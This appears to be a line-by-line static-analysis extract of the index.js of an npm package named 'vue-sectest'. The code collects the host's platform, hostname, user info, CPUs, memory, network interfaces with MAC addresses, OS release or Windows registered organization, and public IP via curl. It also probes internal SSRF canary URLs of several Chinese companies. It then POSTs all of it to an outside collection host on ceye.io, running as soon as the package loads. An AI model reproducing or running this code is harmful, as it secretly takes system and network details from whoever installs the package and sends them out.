// File: tmp/tmppjr8vqef/vue-sectest/package/index.js
// ======================================================================
Line 1: _tmp_30 = require("child_process")
Line 2: const os = require("os")
Line 3: _tmp_31 = require('os')
Line 4: const http = require('http')
Line 8: func()
Line 17: os.platform()
Line 18: os.arch()
Line 20: os.hostname()
Line 21: os.userInfo()
Line 26: os.cpus()
Line 33: os.totalmem()
Line 49: for (const name of Object.keys(nets)) {
    info.networkInterfaces[name] = nets[name].map(net => ({
      address: net.address,
      netmask: net.netmask,
      family: net.family,
      mac: net.mac,
      internal: net.internal
    }));
  }
Line 50: info.networkInterfaces[name] = nets[name].map(net => ({
      address: net.address,
      netmask: net.netmask,
      family: net.family,
      mac: net.mac,
      internal: net.internal
    }))
Line 62: {
  const platform = os.platform();
  const command = platform === "win32" ? "systeminfo" : "cat /etc/os-release";
  
  exec(command, (err, stdout) => {
    if (err) {
      callback("");
      return;
    }
    
    if (platform === "win32") {
      const match = stdout.match(/Registered Organization:\s*(.+)/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    } else {
      const match = stdout.match(/PRETTY_NAME="(.+)"/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    }
  });
}
Line 63: os.platform()
Line 66: exec(command, (err, stdout) => {
    if (err) {
      callback("");
      return;
    }
    
    if (platform === "win32") {
      const match = stdout.match(/Registered Organization:\s*(.+)/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    } else {
      const match = stdout.match(/PRETTY_NAME="(.+)"/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    }
  })
Line 68: callback("")
Line 72: {
      const match = stdout.match(/Registered Organization:\s*(.+)/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    }
Line 74: callback(match ? match[1].trim().replace(/\s+/g, "_") : "")
Line 75: {
      const match = stdout.match(/PRETTY_NAME="(.+)"/);
      callback(match ? match[1].trim().replace(/\s+/g, "_") : "");
    }
Line 77: callback(match ? match[1].trim().replace(/\s+/g, "_") : "")
Line 85: _tmp_11.push("curl -s ipinfo.io")
Line 86: _tmp_11.push("curl -s ifconfig.me")
Line 87: _tmp_11.push("curl -s icanhazip.com")
Line 92: {
    if (currentIndex >= commands.length) {
      callback("");
      return;
    }
    
    exec(commands[currentIndex], (error, stdout) => {
      if (error) {
        currentIndex++;
        tryNextCommand();
        return;
      }
      
      try {
        const data = JSON.parse(stdout);
        callback(data.ip || "");
      } catch {
        callback(stdout.trim());
      }
    });
  }
Line 94: callback("")
Line 98: exec(commands[currentIndex], (error, stdout) => {
      if (error) {
        currentIndex++;
        tryNextCommand();
        return;
      }
      
      try {
        const data = JSON.parse(stdout);
        callback(data.ip || "");
      } catch {
        callback(stdout.trim());
      }
    })
Line 106: const data = JSON.parse(stdout)
Line 107: callback(data.ip || "")
Line 109: callback(stdout.trim())
Line 117: {
  const options = {
    hostname: '2i8hgh.ceye.io',
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(JSON.stringify(data))
    }
  };

  const req = http.request(options, (res) => {
    console.log(`状态码: ${res.statusCode}`);
    res.on('data', (d) => {
      console.log('响应数据:', d.toString());
    });
  });

  req.on('error', (error) => {
    console.error('请求错误:', error);
  });

  req.write(JSON.stringify(data));
  req.end();
}
Line 128: const req = http.request(options, (res) => {
    console.log(`状态码: ${res.statusCode}`);
    res.on('data', (d) => {
      console.log('响应数据:', d.toString());
    });
  })
Line 131: d.toString()
Line 139: req.write(JSON.stringify(data))
Line 140: req.end()
Line 144: {
    const options = {
      timeout: timeout,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      }
    };

    const req = http.request(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          data: data
        });
      });
    });

    req.on('error', () => {
      resolve(null);
    });

    req.on('timeout', () => {
      req.destroy();
      resolve(null);
    });

    req.end();
  }
Line 153: const req = http.request(url, options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          data: data
        });
      });
    })
Line 171: {
      req.destroy();
      resolve(null);
    }
Line 172: req.destroy()
Line 176: req.end()
Line 182: _tmp_18.push({ url: 'http://www.asrctest.com/ssrf.html', src: '阿里src' })
Line 183: _tmp_18.push({ url: 'http://tst.qq.com/flag.html', src: '腾讯src' })
Line 184: _tmp_18.push({ url: 'http://10.229.2.9:5001/', src: '360src' })
Line 185: _tmp_18.push({ url: 'http://ssrf.vemic.com/ssrf', src: '焦点科技' })
Line 189: _iterator_1.next()
Line 190: checkURL(url)
Line 191: {
      results[src] = {
        url,
        status: result.status,
        headers: result.headers,
        data: result.data
      };
    }
Line 192: results[src] = {
        url,
        status: result.status,
        headers: result.headers,
        data: result.data
      }
Line 220: _tmp_28.execPath = process.execPath
Line 225: checkAllURLs().then(urlResults => {
        data.urlCheckResults = urlResults;
        console.log('正在发送数据...');
        sendData(data);
      })
Line 228: sendData(data)
Line 234: main()
